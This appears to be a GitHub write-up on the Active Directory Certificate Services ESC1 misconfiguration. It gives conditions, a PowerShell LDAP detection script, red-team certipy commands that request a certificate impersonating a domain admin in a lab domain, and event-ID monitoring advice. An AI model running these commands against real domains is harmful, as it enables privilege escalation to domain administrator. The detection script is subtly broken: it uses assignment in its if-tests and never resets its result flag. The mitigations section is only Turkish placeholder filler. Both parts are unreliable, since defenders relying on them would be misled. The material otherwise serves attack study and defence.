# Table of Contents

1. [ESC1 Vulnerability](#esc1-vulnerability)
1. [Misconfigurations](#misconfigurations)
2. [Manual Detection](#manual-detection)
3. [Red Team Approach](#red-team-approach)
4. [Blue Team Approach](#blue-team-approach)
5. [Mitigations and Best Practices](#mitigations-and-best-practices)




## ESC1 Vulnerability
The ESC1 vulnerability, also known as the "ESC1" or "Enterprise Certificate Services Vulnerability," is a security flaw in certain certificate templates used in Microsoft Active Directory Certificate Services (AD CS). This vulnerability allows users with low privileges to request and obtain certificates <b>on behalf of</b> any domain object, including high-privilege accounts like domain administrators.

## Misconfigurations
<img src="https://github.com/user-attachments/assets/d6aea50f-6f63-400e-8612-e2e95194decd" width="300" height="500">
<img src="https://github.com/user-attachments/assets/79d1ae3a-1d04-4499-9016-11aecdafaa11" width="300" height="500"> <br>
<img src="https://github.com/user-attachments/assets/b1db857d-8f4d-4798-9866-96a4491039ef" width="300" height="500">
<img src="https://github.com/user-attachments/assets/1f1eab61-508b-4c3d-a891-2fd3fcbcac25" width="300" height="500"> <br>

### Misconfigurations Condition

```
IF 
(
    Requester has the ability to specify subjectAltName (SAN) in the CSR // Suplly in Request is selected i.e., msPKI-Certificate-Name is set to flag "CT_FLAG_ENROLEE_SUPPLIES_SUBJECT"
    
    AND

    Manager approval is disabled                              // The msPKI-Enrollment-Flag must NOT have the 0x2 bit set

    AND 
    (
        Number of authorized signatures must be 0             // The msPKI-RA-Signature must be 0
        OR 
        msPKI-RA-Signature attribute is NOT present           // The msPKI-RA-Signature attribute must NOT be set (i.e., it doesn't exist)
    )

    AND 
    (
        The template has Smartcard Logon EKU                  // pkiextendedkeyusage = 1.3.6.1.4.1.311.20.2.2  
        OR 
        The template has Client Authentication EKU            // pkiextendedkeyusage = 1.3.6.1.5.5.7.3.2  
        OR 
        The template has PKINIT Client Authentication EKU     // pkiextendedkeyusage = 1.3.6.1.5.2.3.4
        OR
        The template has Any Purpose EKU                      // pkiextendedkeyusage = 2.5.29.37.0
        OR
        The template has no EKU
    )

    AND
    (
        Authenticated Users can enroll    // IdentityReference is Authenticated Users, ActiveDirectoryRights is ExtendedRight
        OR
        Domain Users can enroll           // IdentityReference is Domain Users, ActiveDirectoryRights is ExtendedRight
        OR
        Everyone can enroll               // IdentityReference is Everyone, ActiveDirectoryRights is ExtendedRight
    ) 
    
)
```

## Manual Detection with Powershell and LDAP

```powershell
$domain = "DC=hogwarts,DC=local"
$Filter1 = '(objectclass=pkicertificatetemplate)' #Ensure that object is certificate
$Filter2 = '(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))' #Ensure that manager approval is disabled

$Filter3_1 = '(msPKI-RA-Signature=0)' # Ensure that 0 signatures required for a cert enrollment.
$Filter3_2 = '(!(msPKI-RA-Signature=*))' #Ensure that this attribute not set (i.e. it does not exist.)
$Filter3 = "(|"+$Filter3_1+$Filter3_2+")"

$Filter4 = "(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1)" # Ensure that msPKI-Certificate-Name is set to flag (CT_FLAG_ENROLEE_SUPPLIES_SUBJECT)

$Filter5 = "(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))"
# "(pkiextendedkeyusage = 1.3.6.1.4.1.311.20.2.2)" # SmartCard Logon
# "(pkiextendedkeyusage = 1.3.6.1.5.5.7.3.2)"      # Client Authentication
# "(pkiextendedkeyusage = 1.3.6.1.5.2.3.4)"        # PKINIT Client Authentication
# "(pkiextendedkeyusage = 2.5.29.37.0)"            # Any Purpose
# "(!(pkiextendedkeyusage=*))"                     # If pkiextendedkeyusage is not set. 

$Filter_LAST = "(&"+$Filter1+$Filter2+$Filter3+$Filter4+$Filter5+ ")"

$possible_certs = Get-ADObject -LDAPFilter $Filter_Last -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$($domain)" -Properties nTSecurityDescriptor | Where-Object { $_.Name -notin @("CA", "SubCA", "OfflineRouter") }
$cert_count = ($possible_certs | Measure-Object).Count

if($cert_count -ne 0)
{
    $RESULT = 0
    foreach ($cert in $possible_certs) {
        $acl = $cert.nTSecurityDescriptor
        foreach ($access in $acl.Access) {
            if((($access.IdentityReference -like "*Authenticated Users*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*')) -or (($access.IdentityReference -like "*Domain Users*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*')) -or (($access.IdentityReference -like "*Everyone*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*'))){
                $RESULT = 1
            }
        }
        if( $RESULT = 1){
            Write-Host "$($cert.Name) is ESC1 vulnerable."
        }
    }

    if( $RESULT = 0){
        Write-Host "No certificate is ESC1 vulnerable."
    }
}
else
{
    Write-Host "No certificate is ESC1 vulnerable."
}
```


## Red Team Approach
HOGWARTS\harry.potter is a user with lowest privilege. It is a just a member of Domain Users. <br>
HOGWARTS\severus.snape is a domain admin. <br>
### Step1-Find vulnerable Certificates
```console
# certipy-ad find -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip "192.168.0.111"  -enabled -vulnerable -debug
```
<b>-enabled</b>    : Ignore disabled templates. <br>
<b>-vulnerable</b> : Show certificate templates that are vulnerable to known attacks or misconfigurations. <br>
<b>-debug</b>      : Provide more detailed information about the command's execution process. <br>

<img src="https://github.com/user-attachments/assets/c7572d8e-f948-4302-baa3-849486559f95">

### Step2-Request a Certificated Issued to Domain Admin

```console
# certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'ESC1_Template' -upn 'severus.snape@hogwarts.local' -target CERT01.hogwarts.local -debug
```
<b>-ca</b>         : Specify CA.<br>
<b>-template</b>   : Specify template name. <br>
<b>-upn</b>        : Set UPN. This UPN will be included in the issued certificate. It allows impersonating <b>HOGWARTS\severus.snape</b> <br>
<b>-target</b>     : DNS name of the CA. <br>

<img src="https://github.com/user-attachments/assets/50137654-442c-44f1-b482-6353bd56671a">

## Blue Team Approach

### Monitoring

<b>Enable Audit Certification Services with GPO.</b> </br>
Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit Certification Services.</br>

<b>Enable Audit Kerberos Authentication Service and Audit Kerberos Service Ticket Operations</b></br>
Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Account Logon</br>

<b>Enable Certificate Authority Auditing</b></br>
certsrv.msc -> Right Click to CA -> Properties -> Auditing -> Select All except "Start Stop Active Directory Certificate Services"

|Server| Event ID | Description |
|---| --- | --- |
| Certificate Server | 4886 | Request for Certificate (Certificate Services received a certificate request.) |
| Certificate Server | 4887 | Certificate Services received a certificate request. |
| Domain Controller | 4768 | A Kerberos authentication ticket (TGT) was requested. |
| Domain Controller | 4769 | A Kerberos service ticket was requested. |
</br>

#### Monitoring Step2 of Red Team Approach
<p>
    <img src="https://github.com/user-attachments/assets/d00d79ce-b84b-4acb-9150-70d8d361ebee">
    <em>image_caption</em>
</p>


## Mitigations and Best Practices

1500'lü yıllarda, bir matbaacı Cicero'nun bu metnini alarak baskı örneklerinin yer aldığı bir sayfa yaptı. O günden beri, Latince'ye benzeyen bu metin matbaacılıkta sahte bir standart metin olarak kullanılmaktadır. Elektronik yayımcılıktan önce, grafik tasarımcıların metni gösteren kıvrımlı çizgilerle desenler oluşturmaları gerekiyordu. "Lorem ipsum" metni basılan yapışkan sayfalarda, metnin nereye gireceği açıkça görülüyordu.
Anlamlı bir metin gibi görünen bu ifade, yazı tiplerini göstermek amacıyla matbaacılar tarafından birkaç yüzyıldır kullanılmaktadır. İçerdiği harfler ve bu birleşimlerin harf aralıkları, yazı tipinin ağırlığını, tasarımını ve diğer önemli özelliklerini açıkça gösterdiği için tercih edilmektedir.

